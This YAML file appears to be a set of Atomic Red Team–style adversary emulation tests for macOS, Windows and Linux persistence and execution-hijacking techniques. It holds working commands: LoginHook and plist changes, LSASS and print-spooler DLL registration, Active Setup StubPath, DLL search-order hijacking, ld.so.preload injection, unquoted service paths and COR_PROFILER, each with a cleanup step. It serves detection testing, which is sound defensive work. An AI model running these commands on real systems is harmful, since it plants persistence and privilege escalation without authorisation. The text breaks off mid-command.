    Adversaries may modify plist files to automatically run an application when a user logs in. When a user logs out or restarts via the macOS Graphical User Interface (GUI), a prompt is provided to the user with a checkbox to "Reopen windows when logging back in".(Citation: Re-Open windows on Mac) When selected, all applications currently open are added to a property list file named <code>com.apple.loginwindow.[UUID].plist</code> within the <code>~/Library/Preferences/ByHost</code> directory.(Citation: Methods of Mac Malware Persistence)(Citation: Wardle Persistence Chapter) Applications listed in this file are automatically reopened upon the user’s next logon.

    Adversaries can establish [Persistence](https://attack.mitre.org/tactics/TA0003) by adding a malicious application path to the <code>com.apple.loginwindow.[UUID].plist</code> file to execute payloads when a user logs in.
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - macos
  executors:
    - name: Copy in loginwindow.plist for Re-Opened Applications
      type: sh
      platform: macos
      command: cp PathToAtomicsFolder/T1547.007/src/reopen_loginwindow_calc.plist ~/Library/Preferences/ByHost/com.apple.loginwindow.plist
      cleanup: rm -f ~/Library/Preferences/ByHost/com.apple.loginwindow.plist
      timeout: 60
      is_safe: true
    - name: Re-Opened Applications using LoginHook
      type: sh
      platform: macos
      command: sudo defaults write com.apple.loginwindow LoginHook /path/to/script
      cleanup: sudo defaults delete com.apple.loginwindow LoginHook
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Append to existing loginwindow for Re-Opened Applications
      type: sh
      platform: macos
      command: |-
        FILE=`find ~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist -type f | head -1`
        if [ -z "${FILE}" ] ; then echo "No loginwindow plist file found" && exit 1 ; fi
        echo save backup copy to /tmp/
        cp ${FILE} /tmp/t1547007_loginwindow-backup.plist
        echo before
        plutil -p ${FILE}
        echo overwriting...
        /tmp/t1547007_append_exe ${FILE} && echo after && plutil -p ${FILE}
      cleanup: |-
        rm -f /tmp/t1547007_append_exe
        # revert to backup copy
        FILE=`find ~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist -type f | head -1`
        if [ -z "${FILE}" ] ; then
           exit 0
        fi
        mv /tmp/t1547007_loginwindow-backup.plist ${FILE}
      timeout: 60
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1547/007
  is_safe: true
- id: T1547.008
  name: LSASS Driver
  description: |-
    Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process.(Citation: Microsoft Security Subsystem)

    Adversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g., [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574)), an adversary can use LSA operations to continuously execute malicious payloads.
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - windows
  executors:
    - name: Modify Registry to load Arbitrary DLL into LSASS - LsaDbExtPt
      type: powershell
      platform: windows
      command: New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt -Value "PathToAtomicsFolder\..\ExternalPayloads\lsass_lib.dll"
      cleanup: Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS" -Name "LsaDbExtPt" -ErrorAction Ignore | Out-Null
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1547/008
  is_safe: false
- id: T1547.009
  name: Shortcut Modification
  description: |-
    Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.

    Adversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence.(Citation: Shortcut for Persistence ) Although often used as payloads in an infection chain (e.g. [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)), adversaries may also create a new shortcut as a means of indirection, while also abusing [Masquerading](https://attack.mitre.org/techniques/T1036) to make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.

    Shortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g. [Browser Extensions](https://attack.mitre.org/techniques/T1176/001)) to persistently launch malware.
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - windows
  executors:
    - name: Shortcut Modification
      type: cmd
      platform: windows
      command: |-
        echo [InternetShortcut] > %temp%\T1547.009_modified_shortcut.url
        echo URL=C:\windows\system32\calc.exe >> %temp%\T1547.009_modified_shortcut.url
        %temp%\T1547.009_modified_shortcut.url
      cleanup: del -f %temp%\T1547.009_modified_shortcut.url >nul 2>&1
      timeout: 120
      is_safe: true
    - name: Create shortcut to cmd in startup folders
      type: powershell
      platform: windows
      command: |-
        $Shell = New-Object -ComObject ("WScript.Shell")
        $ShortCut = $Shell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1547.009.lnk")
        $ShortCut.TargetPath="cmd.exe"
        $ShortCut.WorkingDirectory = "C:\Windows\System32";
        $ShortCut.WindowStyle = 1;
        $ShortCut.Description = "T1547.009.";
        $ShortCut.Save()

        $Shell = New-Object -ComObject ("WScript.Shell")
        $ShortCut = $Shell.CreateShortcut("$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1547.009.lnk")
        $ShortCut.TargetPath="cmd.exe"
        $ShortCut.WorkingDirectory = "C:\Windows\System32";
        $ShortCut.WindowStyle = 1;
        $ShortCut.Description = "T1547.009.";
        $ShortCut.Save()
      cleanup: |-
        Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1547.009.lnk" -ErrorAction Ignore
        Remove-Item "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1547.009.lnk" -ErrorAction Ignore
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1547/009
  is_safe: true
- id: T1547.010
  name: Port Monitors
  description: "Adversaries may use port monitors to run an adversary supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the <code>AddMonitor</code> API call to set a DLL to be loaded at startup.(Citation: AddMonitor) This DLL can be located in <code>C:\\Windows\\System32</code> and will be loaded and run by the print spooler service, `spoolsv.exe`, under SYSTEM level permissions on boot.(Citation: Bloxham) \n\nAlternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to the `Driver` value of an existing or new arbitrarily named subkey of <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors</code>. The Registry key contains entries for the following:\n\n* Local Port\n* Standard TCP/IP Port\n* USB Monitor\n* WSD Port"
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - windows
  executors:
    - name: Add Port Monitor persistence in Registry
      type: cmd
      platform: windows
      command: reg add "hklm\system\currentcontrolset\control\print\monitors\AtomicRedTeam" /v "Driver" /d "$PathToAtomicsFolder\T1547.010\bin\PortMonitor.dll" /t REG_SZ /f
      cleanup: reg delete "hklm\system\currentcontrolset\control\print\monitors\AtomicRedTeam" /f >nul 2>&1
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1547/010
  is_safe: false
- id: T1547.012
  name: Print Processors
  description: |-
    Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, `spoolsv.exe`, during boot.(Citation: Microsoft Intro Print Processors)

    Adversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the <code>AddPrintProcessor</code> API call with an account that has <code>SeLoadDriverPrivilege</code> enabled. Alternatively, a print processor can be registered to the print spooler service by adding the <code>HKLM\SYSTEM\\[CurrentControlSet or ControlSet001]\Control\Print\Environments\\[Windows architecture: e.g., Windows x64]\Print Processors\\[user defined]\Driver</code> Registry key that points to the DLL.

    For the malicious print processor to be correctly installed, the payload must be located in the dedicated system print-processor directory, that can be found with the <code>GetPrintProcessorDirectory</code> API call, or referenced via a relative path from this directory.(Citation: Microsoft AddPrintProcessor May 2018) After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.(Citation: ESET PipeMon May 2020)

    The print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - windows
  executors:
    - name: Print Processors
      type: powershell
      platform: windows
      command: |-
        if( $(get-service -Name spooler).StartType -eq "Disabled") {Set-Service -Name "spooler" -StartupType Automatic}
        net stop spooler
        Copy-Item "$PathToAtomicsFolder\T1547.012\bin\AtomicTest.dll" C:\Windows\System32\spool\prtprocs\x64\AtomicTest.dll
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\AtomicRedTeam" /v "Driver" /d "AtomicTest.dll" /t REG_SZ /f
        net start spooler
        if(0){
          Restart-Computer
        }
      cleanup: |-
        net stop spooler
        rm -force C:\Windows\System32\spool\prtprocs\x64\AtomicTest.dll -ErrorAction SilentlyContinue
        rm -force C:\Users\Public\AtomicTest.txt -ErrorAction SilentlyContinue
        remove-item "HKLM:\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\AtomicRedTeam" -Force -ErrorAction SilentlyContinue
        net start spooler
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1547/012
  is_safe: false
- id: T1547.014
  name: Active Setup
  description: |-
    Adversaries may achieve persistence by adding a Registry key to the Active Setup of the local machine. Active Setup is a Windows mechanism that is used to execute programs when a user logs in. The value stored in the Registry key will be executed after a user logs into the computer.(Citation: Klein Active Setup 2010) These programs will be executed under the context of the user and will have the account's associated permissions level.

    Adversaries may abuse Active Setup by creating a key under <code> HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\</code> and setting a malicious value for <code>StubPath</code>. This value will serve as the program that will be executed when a user logs into the computer.(Citation: Mandiant Glyer APT 2010)(Citation: Citizenlab Packrat 2015)(Citation: FireEye CFR Watering Hole 2012)(Citation: SECURELIST Bright Star 2015)(Citation: paloalto Tropic Trooper 2016)

    Adversaries can abuse these components to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - windows
  executors:
    - name: HKLM - Add atomic_test key to launch executable as part of user setup
      type: powershell
      platform: windows
      command: "New-Item \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\" -Name \"atomic_test\" -Force\nSet-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\atomic_test\" \"(Default)\" \"ART TEST\" -Force\nSet-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\atomic_test\" \"StubPath\" \"C:\\Windows\\System32\\calc.exe\" -Force \n& $env:SYSTEMROOT\\system32\\runonce.exe /AlternateShellStartup"
      cleanup: |-
        Remove-Item "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\atomic_test" -Force -ErrorAction Ignore
        Remove-Item "HKCU:\SOFTWARE\Microsoft\Active Setup\Installed Components\atomic_test" -Force -ErrorAction Ignore
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: HKLM - Add malicious StubPath value to existing Active Setup Entry
      type: powershell
      platform: windows
      command: |-
        Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}" "StubPath" "C:\Windows\System32\calc.exe" -Force
        & $env:SYSTEMROOT\system32\runonce.exe /AlternateShellStartup
      cleanup: |-
        Remove-ItemProperty "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}" -Name "StubPath" -Force
        Remove-ItemProperty "HKCU:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}" -Name "Version" -Force
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: HKLM - re-execute 'Internet Explorer Core Fonts' StubPath payload by decreasing version number
      type: powershell
      platform: windows
      command: |-
        Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}" -Name "Version" -Value "0,0,0,0"
        & $env:SYSTEMROOT\system32\runonce.exe /AlternateShellStartup
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1547/014
  is_safe: false
- id: T1547.015
  name: Login Items
  description: |-
    Adversaries may add login items to execute upon user login to gain persistence or escalate privileges. Login items are applications, documents, folders, or server connections that are automatically launched when a user logs in.(Citation: Open Login Items Apple) Login items can be added via a shared file list or Service Management Framework.(Citation: Adding Login Items) Shared file list login items can be set using scripting languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002), whereas the Service Management Framework uses the API call <code>SMLoginItemSetEnabled</code>.

    Login items installed using the Service Management Framework leverage <code>launchd</code>, are not visible in the System Preferences, and can only be removed by the application that created them.(Citation: Adding Login Items)(Citation: SMLoginItemSetEnabled Schroeder 2013) Login items created using a shared file list are visible in System Preferences, can hide the application when it launches, and are executed through LaunchServices, not launchd, to open applications, documents, or URLs without using Finder.(Citation: Launch Services Apple Developer) Users and applications use login items to configure their user environment to launch commonly used services or applications, such as email, chat, and music applications.

    Adversaries can utilize [AppleScript](https://attack.mitre.org/techniques/T1059/002) and [Native API](https://attack.mitre.org/techniques/T1106) calls to create a login item to spawn malicious executables.(Citation: ELC Running at startup) Prior to version 10.5 on macOS, adversaries can add login items by using [AppleScript](https://attack.mitre.org/techniques/T1059/002) to send an Apple events to the “System Events” process, which has an AppleScript dictionary for manipulating login items.(Citation: Login Items AE) Adversaries can use a command such as <code>tell application “System Events” to make login item at end with properties /path/to/executab...
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - macos
  executors:
    - name: Add macOS LoginItem using Applescript
      type: bash
      platform: macos
      command: osascript PathToAtomicsFolder/T1547.015/src/add_login_item.osa
      cleanup: osascript PathToAtomicsFolder/T1547.015/src/remove_login_item.osa
      timeout: 60
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1547/015
  is_safe: true
- id: T1574.001
  name: DLL
  description: |-
    Adversaries may abuse dynamic-link library files (DLLs) in order to achieve persistence, escalate privileges, and evade defenses. DLLs are libraries that contain code and data that can be simultaneously utilized by multiple programs. While DLLs are not malicious by nature, they can be abused through mechanisms such as side-loading, hijacking search order, and phantom DLL hijacking.(Citation: unit 42)

    Specific ways DLLs are abused by adversaries include:

    ### DLL Sideloading
    Adversaries may execute their own malicious payloads by side-loading DLLs. Side-loading involves hijacking which DLL a program loads by planting and then invoking a legitimate application that executes their payload(s).

    Side-loading positions both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.

    Adversaries may also side-load other packages, such as BPLs (Borland Package Library).(Citation: kroll bpl)

    Adversaries may chain DLL sideloading multiple times to fragment functionality hindering analysis. Adversaries using multiple DLL files can split the loader functions across different DLLs, with a main DLL loading the separated export functions. (Citation: Virus Bulletin) Spreading loader functions across multiple DLLs makes analysis harder, since all files must be collected to fully understand the malware’s behavior.  Another method implements a “loader-for-a-loader”, where a malicious DLL’s sole role is to load a second DLL (or a chain of DLLs) that contain the real payload. (Citation: Sophos)

    ### DLL Search Order Hijacking
    Adversaries may execute their own malicious payloads by hijacki...
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
    - defense-evasion
  platforms:
    - windows
  executors:
    - name: DLL Search Order Hijacking - amsi.dll
      type: cmd
      platform: windows
      command: |-
        copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe
        copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
        %APPDATA%\updater.exe -Command exit
      cleanup: |-
        del %APPDATA%\updater.exe >nul 2>&1
        del %APPDATA%\amsi.dll >nul 2>&1
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Phantom Dll Hijacking - WinAppXRT.dll
      type: cmd
      platform: windows
      command: |-
        copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
        ren %APPDATA%\amsi.dll WinAppXRT.dll
        copy %APPDATA%\WinAppXRT.dll %windir%\System32\WinAppXRT.dll
        reg add "HKEY_CURRENT_USER\Environment" /v APPX_PROCESS /t REG_EXPAND_SZ /d "1" /f
      cleanup: |-
        reg delete "HKEY_CURRENT_USER\Environment" /v APPX_PROCESS /f
        del %windir%\System32\WinAppXRT.dll
        del %APPDATA%\WinAppXRT.dll
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Phantom Dll Hijacking - ualapi.dll
      type: cmd
      platform: windows
      command: |-
        copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
        ren %APPDATA%\amsi.dll ualapi.dll
        copy %APPDATA%\ualapi.dll %windir%\System32\ualapi.dll
        sc config Spooler start=auto
      cleanup: |-
        del %windir%\System32\ualapi.dll
        del %APPDATA%\ualapi.dll
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: DLL Side-Loading using the Notepad++ GUP.exe binary
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\T1574.002\bin\GUP.exe"'
      cleanup: taskkill /F /IM calculator.exe >nul 2>&1
      timeout: 120
      is_safe: true
    - name: DLL Side-Loading using the dotnet startup hook environment variable
      type: cmd
      platform: windows
      command: |-
        set DOTNET_STARTUP_HOOKS="PathToAtomicsFolder\T1574.002\bin\preloader.dll"
        dotnet -h > nul
        echo.
      cleanup: taskkill /F /IM calculator.exe >nul 2>&1
      timeout: 120
      is_safe: true
    - name: DLL Search Order Hijacking,DLL Sideloading Of KeyScramblerIE.DLL Via KeyScrambler.EXE
      type: powershell
      platform: windows
      command: |-
        Write-Host 1.Downloading KeyScrambler from official website to temp directory
        Invoke-WebRequest -Uri "https://download.qfxsoftware.com/download/latest/KeyScrambler_Setup.exe" -OutFile $env:Temp\KeyScrambler_Setup.exe
        Write-Host 2.Installing KeyScrambler with KeyScrambler_Setup.exe from temp directory
        Start-Process -FilePath $env:Temp\KeyScrambler_Setup.exe -ArgumentList /S -Wait
        Write-Host 3.Copying KeyScrambler.exe to temp folder,to avoid permission issues, which calls KeyScramblerIE.dll in CWD i.e. temp
        Copy-Item "C:\Program Files (x86)\KeyScrambler\KeyScrambler.exe" -Destination $env:TEMP\KeyScrambler.exe
        Write-Host 4.Executing KeyScrambler.exe, you should see a popup of missing KeyScramblerIE.dll, you can close this popup
        Start-Process -FilePath $env:Temp\KeyScrambler.exe
        Write-Host 5.A modified KeyScramblerIE.dll can be copied to temp, which can be misused by Attacker
      cleanup: |-
        Write-Host 1.Kindly close the popup window asking for KeyScramblerIE.dll ,so that it gets deleted.

        Remove-Item -Path $env:Temp\KeyScrambler_Setup.exe
        Start-Process -FilePath "C:\Program Files (x86)\KeyScrambler\Uninstall.exe" -ArgumentList /S -Wait
        Remove-Item -Path $env:Temp\KeyScrambler.exe
        Write-Host 2.KeyScrambler cleanup completed successfully.
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1574/001
  is_safe: true
- id: T1574.006
  name: Dynamic Linker Hijacking
  description: |-
    Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from various environment variables and files, such as <code>LD_PRELOAD</code> on Linux or <code>DYLD_INSERT_LIBRARIES</code> on macOS.(Citation: TheEvilBit DYLD_INSERT_LIBRARIES)(Citation: Timac DYLD_INSERT_LIBRARIES)(Citation: Gabilondo DYLD_INSERT_LIBRARIES Catalina Bypass) Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries)(Citation: Apple Doco Archive Dynamic Libraries) Each platform's linker uses an extensive list of environment variables at different points in execution. These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions in the original library.(Citation: Baeldung LD_PRELOAD)

    Hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. On Linux, adversaries may set <code>LD_PRELOAD</code> to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. For example, adversaries have used `LD_PRELOAD` to inject a malicious library into every descendant process of the `sshd` daemon, resulting in execution under a legitimate process. When the executing sub-process calls the `execve` function, for example, the malicious library’s `execve` function is executed rather than the system function `execve` contained in the system library on disk. This allows adversaries to [Hide Artifacts](https://attack.mitre.org/techniques/T1564) from detection,...
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
    - defense-evasion
  platforms:
    - linux
    - macos
  executors:
    - name: Shared Library Injection via /etc/ld.so.preload
      type: bash
      platform: linux
      command: sudo sh -c 'echo /tmp/T1574006.so > /etc/ld.so.preload'
      cleanup: sudo sed -i 's#/tmp/T1574006.so##' /etc/ld.so.preload
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Shared Library Injection via LD_PRELOAD
      type: bash
      platform: linux
      command: LD_PRELOAD=/tmp/T1574006.so ls
      timeout: 60
      is_safe: true
    - name: Dylib Injection via DYLD_INSERT_LIBRARIES
      type: bash
      platform: macos
      command: DYLD_INSERT_LIBRARIES=/tmp/T1574006MOS.dylib /Applications/Firefox.app/Contents/MacOS/firefox
      cleanup: |-
        kill `pgrep Calculator`
        kill `pgrep firefox`
      timeout: 60
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1574/006
  is_safe: true
- id: T1574.008
  name: Path Interception by Search Order Hijacking
  description: |-
    Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.

    Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike [DLL](https://attack.mitre.org/techniques/T1574/001) search order hijacking, the search order differs depending on the method that is used to execute the program. (Citation: Microsoft CreateProcess) (Citation: Windows NT Command Shell) (Citation: Microsoft WinExec) However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.

    For example, "example.exe" runs "cmd.exe" with the command-line argument <code>net user</code>. An adversary may place a program called "net.exe" within the same directory as example.exe, "net.exe" will be run instead of the Windows system utility net. In addition, if an adversary places a program called "net.com" in the same directory as "net.exe", then <code>cmd.exe /C net user</code> will execute "net.com" instead of "net.exe" due to the order of executable extensions defined under PATHEXT. (Citation: Microsoft Environment Property)

    Search order hijacking is also a common practice for hijacking DLL loads and is covered in [DLL](https://attack.mitre.org/techniques/T1574/001).
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
    - defense-evasion
  platforms:
    - windows
  executors:
    - name: powerShell Persistence via hijacking default modules - Get-Variable.exe
      type: powershell
      platform: windows
      command: |-
        C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:"$env:localappdata\Microsoft\WindowsApps\Get-Variable.exe" "PathToAtomicsFolder\T1574.008\bin\calc.cs"
        Powershell -noprofile
      cleanup: |-
        Remove-Item "$env:localappdata\Microsoft\WindowsApps\Get-Variable.exe" -ErrorAction Ignore
        Stop-Process -Name "calculator"
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1574/008
  is_safe: true
- id: T1574.009
  name: Path Interception by Unquoted Path
  description: |-
    Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.

    Service paths (Citation: Microsoft CurrentControlSet Services) and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <code>C:\unsafe path with space\program.exe</code> vs. <code>"C:\safe path with space\program.exe"</code>). (Citation: Help eliminate unquoted path) (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <code>C:\program files\myapp.exe</code>, an adversary may create a program at <code>C:\program.exe</code> that will be run instead of the intended program. (Citation: Windows Unquoted Services) (Citation: Windows Privilege Escalation Guide)

    This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
    - defense-evasion
  platforms:
    - windows
  executors:
    - name: Execution of program.exe as service with unquoted service path
      type: cmd
      platform: windows
      command: |-
        copy "PathToAtomicsFolder\T1574.009\bin\WindowsServiceExample.exe" "C:\Program Files\windows_service.exe"
        copy "PathToAtomicsFolder\T1574.009\bin\WindowsServiceExample.exe" "C:\program.exe"
        sc create "Example Service" binpath= "C:\Program Files\windows_service.exe" Displayname= "Example Service" start= auto
        sc start "Example Service"
      cleanup: |-
        sc stop "Example Service" >nul 2>&1
        sc delete "Example Service" >nul 2>&1
        del "C:\Program Files\windows_service.exe" >nul 2>&1
        del "C:\program.exe" >nul 2>&1
        del "C:\Time.log" >nul 2>&1
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1574/009
  is_safe: false
- id: T1574.011
  name: Services Registry Permissions Weakness
  description: |-
    Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Flaws in the permissions for Registry keys related to services can allow adversaries to redirect the originally specified executable to one they control, launching their own code when a service starts. Windows stores local service configuration information in the Registry under <code>HKLM\SYSTEM\CurrentControlSet\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  [PowerShell](https://attack.mitre.org/techniques/T1059/001), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through access control lists and user permissions. (Citation: Registry Key Security)(Citation: malware_hides_service)

    If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).

    Adversaries may also alter other Registry keys in the service’s Registry tree. For example, the <code>FailureCommand</code> key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry Perms Weakness)

    The <code>Performance</code> key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.(Citation: microsoft_services_registry_tree) If the <code>Performance</code> key is not already present and if an adversa...
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
    - defense-evasion
  platforms:
    - windows
  executors:
    - name: Service Registry Permissions Weakness
      type: powershell
      platform: windows
      command: |-
        get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\* |FL
        get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\weakservicename |FL
      timeout: 120
      is_safe: true
    - name: Service ImagePath Change with reg.exe
      type: cmd
      platform: windows
      command: reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\calcservice" /f /v ImagePath /d "%windir%\system32\cmd.exe"
      cleanup: sc.exe delete calcservice
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1574/011
  is_safe: true
- id: T1574.012
  name: COR_PROFILER
  description: |-
    Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.(Citation: Microsoft Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013)

    The COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.(Citation: Microsoft COR_PROFILER Feb 2013)

    Adversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)) if the victim .NET process executes at a higher permission level, as well as to hook and [Impair Defenses](https://attack.mitre.org/techniques/T1562) provided by .NET processes.(Citation: RedCanary Mockingbird May 2020)(Citation: Red Canary COR_PROFILER May 2020)(Citation: Almond COR_PROFILER Apr 2019)(Citation: GitHub OmerYa Invisi-Shell)(Citation: subTee .NET Profilers May 2017)
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
    - defense-evasion
  platforms:
    - windows
  executors:
    - name: User scope COR_PROFILER
      type: powershell
      platform: windows
      command: |-
        Write-Host "Creating registry keys in HKCU:Software\Classes\CLSID\{09108e71-974c-4010-89cb-acf471ae9e2c}" -ForegroundColor Cyan
        New-Item -Path "HKCU:\Software\Classes\CLSID\{09108e71-974c-4010-89cb-acf471ae9e2c}\InprocServer32" -Value "PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll" -Force | Out-Null
        New-ItemProperty -Path HKCU:\Environment -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null
